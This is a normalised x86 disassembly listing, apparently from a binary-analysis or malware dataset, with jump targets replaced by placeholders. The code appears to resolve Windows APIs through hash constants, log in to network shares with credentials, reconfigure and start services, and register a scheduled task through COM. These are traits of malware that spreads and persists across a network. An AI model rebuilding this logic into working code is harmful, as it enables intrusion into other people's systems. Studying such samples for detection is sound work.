lea eax [ ebp - 0x140c ]
push eax
call edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x459
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0x140c ]
push eax
call edi
push eax
lea eax [ ebp - 0x140c ]
push eax
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0x8 ]
xor eax eax
mov [ ebp + ecx * 2 - 0x540c ] ax
lea eax [ ebp - 0x540c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call esi
mov ecx 0x400
lea eax [ ebp - 0x40c ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0xd40c ]
push eax
call sub_4077ff
pop ecx
pop ecx
test al al
je r-xdata
pop edi
pop esi
leave
retn
mov ecx [ ebp - 0x40c ]
mov [ ebx + 0x94 ] ecx
cmp ecx 0xffffffff
je r-xdata
cmp ecx [ ebx + 0x90 ]
jbe r-xdata
sub_407b0c
push ebp
mov ebp esp
mov eax 0x8484
call sub_406c70
xor eax eax
push esi
push edi
cmp ebx eax
je r-xdata
xor al al
cmp [ ebx + 0x4 ] eax
je r-xdata
cmp [ ebx + 0x8 ] eax
jle r-xdata
mov [ ebx + 0x94 ] eax
mov ecx 0x8000
lea eax [ ebp - 0x8484 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8484 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x8484 ]
push eax
call esi
push [ rw-data ]
mov edi [ wsprintfW@IAT ]
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x84 ]
push [ rw-data ]
push r--data
push eax
call edi
add esp 0x10
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
push 0x2
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
lea eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
push [ ebx + 0x90 ]
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
push [ ebx + 0x8c ]
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
push [ ebx + 0x8 ]
lea eax [ ebp - 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call esi
mov ecx 0x400
lea eax [ ebp - 0x484 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x484 ]
push eax
lea eax [ ebp - 0x8484 ]
push eax
call sub_4077ff
pop ecx
pop ecx
test al al
je r-xdata
pop edi
pop esi
leave
retn
mov ecx [ ebp - 0x484 ]
mov [ ebx + 0x94 ] ecx
cmp ecx 0xffffffff
je r-xdata
cmp ecx [ ebx + 0x90 ]
jbe r-xdata
sub_407cd1
push ebp
mov ebp esp
mov eax 0x8698
call sub_406c70
push ebx
push esi
mov esi [ lstrcatW@IAT ]
push edi
push 0x77
pop eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x81
lea edi [ ebp - 0x294 ]
[ edi ]
mov edi [ wsprintfW@IAT ]
xor eax eax
mov [ ebp - 0x94 ] ax
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ ebp - 0x8 ] 0x8
mov ebx 0x3b9ac9ff
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x8694 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x8694 ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x8c ]
push [ rw-data ]
push r--data
push eax
call edi
add esp 0x10
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push 0x1
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x8694 ]
push eax
call esi
mov eax [ ebp - 0x8 ]
test eax eax
jle r-xdata
mov ecx 0x400
lea eax [ ebp - 0x694 ]
mov [ ebp - 0xc ] eax
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
lea eax [ ebp - 0x694 ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call sub_4077ff
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x294 ]
push eax
lea eax [ ebp - 0x8694 ]
push eax
call esi
dec [ ebp - 0xc ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
shl ecx 0x8
mov [ edx ] ecx
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov ecx 0x8000
lea eax [ ebp - 0x8694 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407eee
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ad17
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
push ebx
push esi
push edi
lea eax [ esp + 0x2c ]
push eax
call sub_412634
xor eax eax
mov [ esp + 0x11c ] eax
mov [ esp + 0x1c ] eax
cmp [ rw-data ] eax
jne r-xdata
and [ esp + 0x18 ] 0x0
mov [ esp + 0x20 ] 0x30177102
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
mov [ rw-data ] eax
test eax eax
jne r-xdata
or [ esp + 0x11c ] 0xffffffff
lea eax [ esp + 0x2c ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x703295f9
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x28 ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x7f4becad
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x2c ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_4125af
mov esi [ ebp + 0x8 ]
mov eax esi
mov [ rw-data ] 0x80beaa2a
call sub_40d34b
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x54 ] eax
mov eax [ ebp + 0x10 ]
mov [ esp + 0x50 ] esi
lea esi [ esp + 0x5c ]
mov [ rw-data ] edx
mov [ esp + 0x58 ] eax
call sub_40779a
mov eax esi
push eax
push [ esp + 0x18 ]
lea eax [ esp + 0x24 ]
push eax
call sub_407cd1
add esp 0xc
test al al
je r-xdata
inc [ rw-data ]
or [ esp + 0x11c ] 0xffffffff
lea eax [ esp + 0x2c ]
push eax
call sub_4125f1
xor al al
mov ecx [ esp + 0x114 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
inc [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0xf4 ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x11c ] 0x1
push eax
lea ebx [ esp + 0x30 ]
call sub_40157d
xor bl bl
mov [ esp + 0x11c ] bl
lea eax [ esp + 0xec ]
push eax
call sub_4125f1
mov eax [ esp + 0x34 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
imul eax eax 0x3
cdq
and edx 0x3
add eax edx
sar eax 0x2
cdq
push 0x64
pop ecx
idiv ecx
mov ecx eax
mov eax [ esp + 0x58 ]
imul ecx ecx 0x64
cdq
idiv ecx
mov [ esp + 0xdc ] ecx
mov edx eax
imul edx ecx
cmp edx [ esp + 0x58 ]
je r-xdata
push [ esp + 0x14 ]
and [ esp + 0xe8 ] 0x0
lea ebx [ esp + 0x54 ]
mov [ esp + 0xe4 ] eax
call sub_407b0c
pop ecx
test al al
je r-xdata
inc eax
xor edi edi
cmp [ esp + 0xe4 ] 0xffffffff
je r-xdata
mov bl 0x1
mov esi [ Sleep@IAT ]
push 0x32
call esi
push [ esp + 0x14 ]
lea ebx [ esp + 0x54 ]
call sub_4078cf
pop ecx
test al al
jne r-xdata
cmp [ esp + 0xe4 ] 0xffffffff
jne r-xdata
mov eax [ esp + 0x24 ]
imul eax eax 0x3e8
push eax
call esi
inc edi
cmp edi [ esp + 0x28 ]
jg r-xdata
cmp [ esp + 0xe4 ] 0xffffffff
jne r-xdata
sub_40815f
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
mov esi rw-data
mov al 0x1
jmp r-xdata
push 0x1
push ebx
call [ WNetCancelConnectionW@IAT ]
add esi edi
cmp esi rw-data
jl r-xdata
pop edi
pop esi
leave
retn
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x24 ]
[ edi ]
movzx eax [ esi ]
push 0x2
pop edi
push eax
push r--data
push ebx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1c ] 0x9
mov [ ebp - 0x18 ] 0x7
call [ wsprintfW@IAT ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
add esp 0xc
push 0x4
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x14 ] ebx
call [ WNetAddConnection2W@IAT ]
test eax eax
je r-xdata
xor al al
sub_4081e4
push ebp
mov ebp esp
sub esp 0x228
push ebx
push esi
push edi
push 0x6
pop ecx
push [ ebp + 0x1c ]
xor eax eax
push [ ebp + 0x18 ]
lea edi [ ebp - 0x1c ]
push [ ebp + 0x14 ]
lea ebx [ ebp - 0x1c ]
[ edi ]
call sub_40815f
add esp 0xc
test al al
je r-xdata
xor al al
push [ ebp + 0x10 ]
mov eax ebx
push [ ebp + 0x20 ]
push eax
lea eax [ ebp - 0x224 ]
push r--data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x224 ]
add esp 0x14
test eax eax
je r-xdata
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call [ WNetCancelConnectionW@IAT ]
push 0x5
push eax
call sub_40d7b3
mov esi eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push esi
call [ CloseHandle@IAT ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call sub_40d6ff
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call [ WNetCancelConnectionW@IAT ]
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_408290
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ad3b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x478
push ebx
push esi
push edi
lea eax [ esp + 0x38 ]
push eax
call sub_412634
and [ esp + 0x48c ] 0x0
push r--data
call sub_40e6b8
test al al
jne r-xdata
and [ esp + 0x18 ] 0x0
mov [ esp + 0x34 ] 0x30290001
or [ esp + 0x48c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_4125f1
xor al al
xor bl bl
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x34 ]
mov esi ebx
mov [ esp + 0x14 ] 0xf22f2ed
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x2c ]
mov [ esp + 0x14 ] 0x15289533
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x62358130
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x24 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x7f4becad
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
mov esi ebx
mov [ esp + 0x14 ] 0x7c5d2258
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x84 ]
push eax
call [ lstrcpyW@IAT ]
push 0xffffffff
call sub_40e94e
push 0xa
mov esi eax
call sub_40e94e
push eax
call [ Sleep@IAT ]
push 0xffffffff
call sub_40e94e
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_40d34b
inc [ rw-data ]
push edi
push esi
push [ rw-data ]
push edx
push eax
push 0x80beaa2a
lea eax [ esp + 0x298 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0x20
lea eax [ esp + 0x280 ]
push eax
lea eax [ esp + 0x84 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] 0xc422369
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x84 ]
push eax
call ebx
xor esi esi
mov ecx [ esp + 0x484 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov bl 0x1
jmp r-xdata
mov eax [ esp + 0x20 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc esi
cmp esi [ esp + 0x24 ]
jle r-xdata
or [ esp + 0x48c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
push [ esp + 0x2c ]
lea eax [ esp + 0x84 ]
push [ esp + 0x2c ]
push [ esp + 0x24 ]
push [ esp + 0x3c ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4081e4
add esp 0x1c
test al al
jne r-xdata
jmp r-xdata
inc [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x64 ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x48c ] 0x1
push eax
lea ebx [ esp + 0x3c ]
call sub_40157d
mov [ esp + 0x48c ] 0x0
lea eax [ esp + 0x5c ]
push eax
call sub_4125f1
mov eax [ esp + 0x40 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
sub_408518
push ebp
mov ebp esp
sub esp 0xfb8
push esi
push edi
xor edi edi
push edi
push edi
push edi
xor esi esi
inc esi
push esi
push r--data
call [ rw-data ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] esi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] edi
pop edi
sete al
pop esi
leave
retn
push ebx
push esi
push 0x8000000
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ rw-data ]
mov ebx eax
cmp ebx edi
je r-xdata
push [ ebp - 0x14 ]
call [ rw-data ]
pop ebx
push [ ebp + 0x24 ]
push ebx
call [ rw-data ]
push 0x2
push 0x2
push 0x40000000
push [ ebp + 0x10 ]
push ebx
call [ rw-data ]
mov [ ebp - 0xc ] eax
cmp eax edi
je r-xdata
push ebx
call [ rw-data ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov esi 0x2000
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call [ rw-data ]
test eax eax
mov eax [ ebp - 0x10 ]
je r-xdata
mov eax esi
cmp eax edi
jne r-xdata
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] edi
ja r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
push edi
mov [ ebp - 0x10 ] edi
call [ SetLastError@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax esi
jb r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xfb8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x8 ] 0xfa0
call [ InternetGetLastResponseInfoW@IAT ]
push 0x64
call [ Sleep@IAT ]
push [ ebp - 0xc ]
call [ rw-data ]
sub_408633
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ad5f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x478
push ebx
push esi
xor esi esi
push edi
lea eax [ esp + 0x38 ]
push eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] esi
call sub_412634
mov [ esp + 0x48c ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ esp + 0x18 ] esi
mov [ esp + 0x28 ] 0x30383201
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
xor ecx ecx
mov [ rw-data ] eax
cmp [ rw-data ] ecx
je r-xdata
xor bl bl
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
mov esi ebx
mov [ esp + 0x14 ] 0x7c5d2258
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x84 ]
push eax
call [ lstrcpyW@IAT ]
push 0xffffffff
call sub_40e94e
push 0xa
mov esi eax
call sub_40e94e
push eax
call [ Sleep@IAT ]
push 0xffffffff
call sub_40e94e
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_40d34b
inc [ rw-data ]
push edi
push esi
push [ rw-data ]
push edx
push eax
push 0x80beaa2a
lea eax [ esp + 0x298 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0x20
lea eax [ esp + 0x280 ]
push eax
lea eax [ esp + 0x84 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] 0xc422369
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x84 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
xor ebx ebx
mov [ esp + 0x14 ] 0xf22f2ed
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x34 ]
lea ecx [ esp + 0x3c ]
mov [ esp + 0x14 ] 0x11d0f59c
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x24 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x15289533
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x62358130
call sub_412589
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x7f4becad
push eax
lea esi [ esp + 0x30 ]
lea ecx [ esp + 0x3c ]
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x38 ]
lea ecx [ esp + 0x3c ]
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_4125af
or [ esp + 0x48c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_4125f1
xor al al
cmp [ rw-data ] ecx
je r-xdata
mov ecx [ esp + 0x484 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov bl 0x1
jmp r-xdata
mov eax [ esp + 0x2c ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc ebx
cmp ebx [ esp + 0x34 ]
jle r-xdata
cmp [ rw-data ] ecx
je r-xdata
or [ esp + 0x48c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
push [ esp + 0x1c ]
lea eax [ esp + 0x84 ]
push [ esp + 0x28 ]
push [ esp + 0x28 ]
push [ esp + 0x3c ]
push [ esp + 0x24 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_408518
add esp 0x20
test al al
jne r-xdata
jmp r-xdata
cmp [ rw-data ] ecx
je r-xdata
inc [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0x64 ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x48c ] 0x1
push eax
lea ebx [ esp + 0x3c ]
call sub_40157d
mov [ esp + 0x48c ] 0x0
lea eax [ esp + 0x5c ]
push eax
call sub_4125f1
mov eax [ esp + 0x40 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
cmp eax ecx
je r-xdata
inc [ rw-data ]
sub_4089e0
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push 0x1
xor esi esi
push esi
push esi
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push ebx
push 0x14
push r--data
push edi
call [ OpenServiceW@IAT ]
push edi
mov edi [ CloseServiceHandle@IAT ]
mov ebx eax
call edi
cmp ebx esi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop edi
pop esi
leave
retn
cmp [ ebp - 0x18 ] 0x4
jne r-xdata
push ebx
call edi
mov eax esi
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0xffffffff
push 0x2
push 0xffffffff
push ebx
call [ ChangeServiceConfigW@IAT ]
push esi
push esi
push ebx
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
xor esi esi
inc esi
jmp r-xdata
pop ebx
jmp r-xdata
sub_408a67
push ebp
mov ebp esp
sub esp 0x854
push ebx
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x1
push 0x0
push rw-data
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edi rw-data
push edi
mov esi r--data
push esi
push eax
call [ ecx + 0x18 ]
mov ebx eax
test ebx ebx
jns r-xdata
xor al al
cmp [ ebp + 0xc ] 0x28
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push edi
push rw-data
push esi
push eax
call [ ecx + 0x20 ]
mov ebx eax
test ebx ebx
jns r-xdata
push 0x0
push r--data
push 0x2000
push eax
call [ ecx + 0x70 ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x850 ]
push eax
mov [ ebp - 0x14 ] 0x400
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
xor ebx ebx
inc ebx
push ebx
push r--data
call sub_4102c5
push eax
call sub_40dbf0
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
test ebx ebx
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push 0x0
lea edx [ ebp - 0x850 ]
push edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
push [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x80 ]
test eax eax
js r-xdata
call sub_4102c5
mov edi eax
call sub_40e7b9
mov [ esi ] eax
test eax eax
je r-xdata
push eax
call [ ecx + 0x78 ]
mov ebx eax
push 0x4
lea esi [ ebp - 0x50 ]
call sub_40edc9
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx esi
push edx
push eax
call [ ecx + 0x88 ]
test eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
js r-xdata
push eax
call [ ecx + 0x8 ]
jmp r-xdata
push r--data
push eax
call [ ecx + 0x90 ]
test eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
js r-xdata
push 0xffffffff
push eax
call [ ecx + 0xa8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push 0x20
push eax
call [ ecx + 0x98 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0x18 ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
js r-xdata
push 0x30
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_405830
add esp 0xc
push 0x2d
mov eax 0x80c
mov [ ebp - 0x3e ] ax
mov eax ebx
mov [ ebp - 0x3c ] ax
mov [ ebp - 0x3a ] ax
pop eax
mov [ ebp - 0x36 ] ax
mov eax ebx
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x42 ] ax
push 0x30
mov eax 0x7d0
mov [ ebp - 0x44 ] ax
pop eax
mov [ ebp - 0x48 ] ax
xor eax eax
cmp [ ebp + 0xc ] 0x28
push 0x13
setl al
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0xa
mov [ ebp - 0x30 ] ebx
add eax 0x6
mov [ ebp - 0x28 ] eax
pop eax
mov [ ebp - 0x38 ] ax
mov eax ebx
mov [ ebp - 0x24 ] ax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
js r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
push rw-data
push eax
call [ ecx ]
test eax eax
js r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push ebx
push 0x0
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp + 0xc ] 0x32
je r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x30 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov al bl
jmp r-xdata
xor bl bl
pop edi
pop esi
pop ebx
leave
retn
sub_408cce
mov eax sub_41aa70
call sub_416a8c
sub esp 0x8f4
push ebx
push esi
push edi
lea eax [ ebp - 0x58 ]
push eax
mov ebx ecx
call [ VariantInit@IAT ]
xor esi esi
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x18 ]
push eax
push rw-data
push 0x1
push esi
